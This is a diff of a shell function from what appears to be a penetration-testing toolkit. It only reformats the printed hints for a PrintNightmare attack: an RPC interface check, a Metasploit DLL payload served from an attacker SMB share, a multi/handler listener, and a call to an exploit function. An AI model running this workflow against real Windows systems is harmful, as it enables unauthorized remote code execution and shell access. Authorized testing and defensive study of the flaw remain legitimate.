@@ -55,13 +55,13 @@ nb-ad-cve-printnightmare-scan() {
     print -z "rpcdump.py @${__RHOST} | egrep 'MS-RPRN|MS-PAR'"
 
     __info "If target is vulnerable, you can generate a dll payload:"
-    __ok "nb-shell-handlers-msf-payload"
+    __ok "  nb-shell-handlers-msf-payload"
     __info "Then create a share with smbserver.py:"
-    __ok "sudo smbserver.py -smb2support CompData payload.dll"
+    __ok "  sudo smbserver.py -smb2support CompData payload.dll"
     __info "Then configure & start msf multi/handler"
-    __ok "nb-shell-handlers-msf-listener"
+    __ok "  nb-shell-handlers-msf-listener"
     __info "Then exploit the target with command:"
-    __ok "nb-ad-cve-printnightmare-exploit"
+    __ok "  nb-ad-cve-printnightmare-exploit"
 }
 
 nb-ad-cve-printnightmare-exploit() {
